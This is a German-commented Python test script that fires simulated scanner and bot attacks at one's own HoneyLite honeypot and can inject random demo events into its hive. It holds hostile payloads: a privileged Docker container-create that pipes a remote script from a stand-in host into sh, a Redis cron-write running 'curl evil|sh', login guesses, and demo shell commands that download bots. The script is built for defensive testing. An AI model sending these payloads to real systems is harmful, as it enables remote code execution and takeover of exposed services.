#!/usr/bin/env python3
"""HoneyLite Test-Angriffe.

Schickt typische Scanner- und Bot-Anfragen an die EIGENE HoneyLite-Instanz,
damit man sieht, ob alles ankommt. Nur gegen eigene Systeme verwenden.

  python3 attack_sim.py --host 192.168.1.20           # NAS im LAN, Standard-Ports aus .env.example
  python3 attack_sim.py --host 127.0.0.1 --offset 0   # Ports ohne Versatz (z. B. lokale Tests)

Zusätzlich kann --demo N Ereignisse mit zufälligen öffentlichen IPs direkt an den
Hive schicken (braucht HONEYLITE_TOKEN), damit Karte und Statistiken gefüllt sind.
Diese Demo-Daten landen in der Datenbank wie echte Daten.
"""
import argparse
import json
import random
import socket
import ssl
import struct
import sys
import time
import urllib.request
from datetime import datetime, timezone

# Container-Port -> Standard-Host-Port aus .env.example
DEFAULT_HOST_PORTS = {21: 10021, 80: 10080, 443: 10443, 2375: 12375, 2222: 12222,
                      3306: 13306, 6379: 16379, 5900: 15900, 8080: 18080}


def conn(host, port, timeout=5):
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    return s


def recv_some(s, n=4096):
    try:
        return s.recv(n)
    except (socket.timeout, OSError):
        return b""


def t_http(host, port, tls=False):
    reqs = [
        b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nConnection: close\r\n\r\n",
        b"GET /.env HTTP/1.1\r\nHost: x\r\nUser-Agent: curl/7.88.1\r\nConnection: close\r\n\r\n",
        b"POST /wp-login.php HTTP/1.1\r\nHost: x\r\nContent-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 26\r\nConnection: close\r\n\r\nlog=admin&pwd=Password123!",
        b"GET /manager/html HTTP/1.1\r\nHost: x\r\nAuthorization: Basic dG9tY2F0OnMzY3JldA==\r\nConnection: close\r\n\r\n",
    ]
    for r in reqs:
        s = conn(host, port)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname="router.local")
        s.sendall(r)
        data = recv_some(s)
        s.close()
        print(f"  HTTP{'S' if tls else ''} {r.split(b' ')[1].decode()}: {data[:40]!r}")


def t_docker(host, port):
    body = json.dumps({"Image": "alpine", "Cmd": ["sh", "-c", "wget http://203.0.113.9/x.sh|sh"],
                       "HostConfig": {"Binds": ["/:/mnt"], "Privileged": True}}).encode()
    s = conn(host, port)
    s.sendall(b"POST /v1.43/containers/create HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n"
              + f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n".encode() + body)
    print(f"  Docker create: {recv_some(s)[:60]!r}")
    s.close()


def t_ftp(host, port):
    s = conn(host, port)
    f = s.makefile("rb")
    print(f"  FTP Banner: {f.readline()!r}")
    s.sendall(b"USER anonymous\r\n")
    f.readline()
    s.sendall(b"PASS guest@example.com\r\n")
    print(f"  FTP PASS: {f.readline()!r}")
    s.close()


def t_redis(host, port):
    s = conn(host, port)
    for cmd in [["INFO"], ["CONFIG", "SET", "dir", "/var/spool/cron"], ["SET", "x", "*/1 * * * * curl evil|sh"], ["SAVE"]]:
        payload = f"*{len(cmd)}\r\n" + "".join(f"${len(a)}\r\n{a}\r\n" for a in cmd)
        s.sendall(payload.encode())
        r = recv_some(s, 4096)
        print(f"  Redis {cmd[0]}: {r[:30]!r}")
        if not r:
            break
    s.close()


def t_mysql(host, port):
    s = conn(host, port)
    hs = recv_some(s)
    print(f"  MySQL Handshake: {hs[5:20]!r}")
    if len(hs) < 10:
        s.close()
        return
    user = b"root"
    caps = 0x000FA685
    payload = struct.pack("<IIB", caps, 16777216, 33) + b"\x00" * 23 + user + b"\x00" + bytes([20]) + b"\x11" * 20 + b"mysql_native_password\x00"
    s.sendall(struct.pack("<I", len(payload))[:3] + b"\x01" + payload)
    print(f"  MySQL Login: {recv_some(s)[:60]!r}")
    s.close()


def t_ssh_tarpit(host, port):
    s = conn(host, port, timeout=4)
    s.sendall(b"SSH-2.0-libssh_0.9.6\r\n")
    print(f"  SSH-Tarpit (4 s): {recv_some(s, 200)[:60]!r}")
    s.close()


def t_raw(host, port):
    s = conn(host, port, timeout=3)
    s.sendall(b"RFB 003.008\n\x01\x02\x03")
    print(f"  Raw: {recv_some(s, 20)!r}")
    s.close()


def demo(hive, token, n):
    services = [("ftp", 21), ("http", 80), ("https", 443), ("redis", 6379), ("mysql", 3306),
                ("dockerapi", 2375), ("ssh-tarpit", 2222), ("http", 8080), ("ssh", 22), ("telnet", 23)]
    users = ["root", "admin", "user", "test", "ubuntu", "pi", "oracle", "postgres", "support"]
    pws = ["123456", "admin", "password", "root", "12345678", "qwerty", "raspberry", "admin123", "1234"]
    ips = [".".join(str(random.randint(1, 223)) for _ in range(4)) for _ in range(max(5, n // 15))]
    now = time.time()
    events = []
    for i in range(n):
        svc, port = random.choice(services)
        ip = random.choice(ips)
        ts = datetime.fromtimestamp(now - random.random() * 86400 * 2, timezone.utc).isoformat()
        sess = f"demo{random.randint(0, 10**9):x}"
        base = {"ts": ts, "service": svc, "src_ip": ip, "src_port": random.randint(1024, 65535), "dst_port": port, "session": sess}
        events.append({**base, "type": "connect"})
        if svc in ("ssh", "telnet", "ftp", "mysql", "redis") and random.random() < .6:
            events.append({**base, "type": "login", "username": random.choice(users), "password": random.choice(pws)})
        if svc in ("ssh", "telnet") and random.random() < .3:
            events.append({**base, "type": "command", "data": {"input": random.choice(["uname -a", "cat /proc/cpuinfo", "wget http://203.0.113.5/bot.sh", "cd /tmp; chmod +x x; ./x"])}})
        if svc in ("http", "https"):
            events.append({**base, "type": "request", "data": {"method": "GET", "path": random.choice(["/", "/.env", "/wp-login.php", "/cgi-bin/luci", "/actuator/health"]), "user_agent": "Mozilla/5.0"}})
        tarpit = svc == "ssh-tarpit" or random.random() < .1
        tms = random.randint(5000, 3600000) if tarpit else 0
        events.append({**base, "type": "disconnect", "duration_ms": tms or random.randint(10, 5000), "tarpit": tarpit, "tarpit_ms": tms})
    req = urllib.request.Request(hive.rstrip("/") + "/api/ingest", method="POST",
                                 data=json.dumps({"sensor": "demo", "events": events}).encode(),
                                 headers={"Authorization": "Bearer " + token, "Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=30) as r:
        print(f"  Demo: {len(events)} Ereignisse gesendet, Antwort {r.read().decode().strip()}")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--offset", type=int, default=-1, help="0 = Container-Ports direkt; Standard: Host-Ports aus .env.example")
    ap.add_argument("--demo", type=int, default=0, help="N Demo-Ereignisse direkt an den Hive senden")
    ap.add_argument("--hive", default="http://127.0.0.1:8088")
    ap.add_argument("--token", default="")
    ap.add_argument("--no-attacks", action="store_true", help="nur --demo ausführen, keine Test-Angriffe")
    a = ap.parse_args()

    def p(container_port):
        return container_port + a.offset if a.offset >= 0 else DEFAULT_HOST_PORTS[container_port]

    tests = [("HTTP", lambda: t_http(a.host, p(80))), ("HTTPS", lambda: t_http(a.host, p(443), tls=True)),
             ("Docker-API", lambda: t_docker(a.host, p(2375))), ("FTP", lambda: t_ftp(a.host, p(21))),
             ("Redis", lambda: t_redis(a.host, p(6379))), ("MySQL", lambda: t_mysql(a.host, p(3306))),
             ("SSH-Tarpit", lambda: t_ssh_tarpit(a.host, p(2222))), ("Raw", lambda: t_raw(a.host, p(5900))),
             ("HTTP-Alt (hybrid)", lambda: t_http(a.host, p(8080)))]
    if not a.no_attacks:
        for name, fn in tests:
            print(name)
            try:
                fn()
            except Exception as e:  # noqa: BLE001
                print(f"  Fehler: {e}")
    if a.demo:
        if not a.token:
            sys.exit("--demo braucht --token (HONEYLITE_TOKEN aus .env)")
        demo(a.hive, a.token, a.demo)


if __name__ == "__main__":
    main()
